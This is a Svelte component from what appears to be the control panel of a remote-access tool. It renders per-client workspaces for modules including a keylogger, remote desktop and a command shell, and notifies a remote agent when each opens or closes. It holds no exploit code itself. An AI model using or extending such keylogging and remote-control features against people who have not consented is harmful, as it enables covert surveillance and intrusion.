<script lang="ts">
	import { browser } from '$app/environment';
	import { onMount } from 'svelte';
	import { Alert, AlertDescription, AlertTitle } from '$lib/components/ui/alert/index.js';
	import type { Client } from '$lib/data/clients';
	import type { ClientToolDefinition } from '$lib/data/client-tools';
	import type { DialogToolId } from '$lib/data/client-tools';
	import {
		getKeyloggerMode,
		getWorkspaceComponent,
		isWorkspaceTool,
		workspaceRequiresAgent
	} from '$lib/data/client-tool-workspaces';
	import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
	import { notifyToolActivationCommand } from '$lib/utils/agent-commands.js';
	import type { AgentSnapshot } from '../../../../../shared/types/agent';
	import { AlertCircle } from '@lucide/svelte';

	const {
		client,
		tool,
		agent = null
	} = $props<{
		client: Client;
		tool: ClientToolDefinition;
		agent?: AgentSnapshot | null;
	}>();

	const isWorkspace = $derived(isWorkspaceTool(tool.id));
	const dialogToolId = $derived(() => (isWorkspace ? (tool.id as DialogToolId) : null));
	const keyloggerMode = $derived(() => (dialogToolId ? getKeyloggerMode(dialogToolId) : null));
	const workspaceComponent = $derived(() =>
		dialogToolId ? getWorkspaceComponent(dialogToolId) : null
	);
	const requiresAgent = $derived(() =>
		dialogToolId ? workspaceRequiresAgent.has(dialogToolId) : false
	);
	const missingAgent = $derived(requiresAgent && !agent);

	const workspaceProps = $derived(() => {
		if (!dialogToolId || !workspaceComponent) {
			return null;
		}
		const base: Record<string, unknown> = { client };
		if (dialogToolId === 'cmd') {
			base.agent = agent;
		}
		if (dialogToolId === 'remote-desktop') {
			base.initialSession = null;
		}
		return base;
	});

	onMount(() => {
		if (!browser || !dialogToolId) {
			return;
		}

		notifyToolActivationCommand(client.id, dialogToolId, {
			action: 'open',
			metadata: { surface: 'workspace' }
		});

		return () => {
			notifyToolActivationCommand(client.id, dialogToolId, {
				action: 'close',
				metadata: { surface: 'workspace' }
			});
		};
	});
</script>

{#if !isWorkspace}
	<Alert>
		<AlertCircle class="h-4 w-4" />
		<AlertTitle>Workspace unavailable</AlertTitle>
		<AlertDescription>
			This module doesn&rsquo;t expose an embedded workspace yet. Define the workflow before linking
			it to the agent.
		</AlertDescription>
	</Alert>
{:else if missingAgent}
	<Alert variant="destructive">
		<AlertCircle class="h-4 w-4" />
		<AlertTitle>Agent session required</AlertTitle>
		<AlertDescription>
			Reconnect this client before launching the {tool.title} workspace.
		</AlertDescription>
	</Alert>
{:else if keyloggerMode}
	<KeyloggerWorkspace {client} mode={keyloggerMode} />
{:else if workspaceComponent && workspaceProps}
	<svelte:component this={workspaceComponent} {...workspaceProps} />
{:else}
	<Alert>
		<AlertCircle class="h-4 w-4" />
		<AlertTitle>Workspace not implemented</AlertTitle>
		<AlertDescription>
			The embedded workspace for {tool.title} hasn&rsquo;t been added yet.
		</AlertDescription>
	</Alert>
{/if}
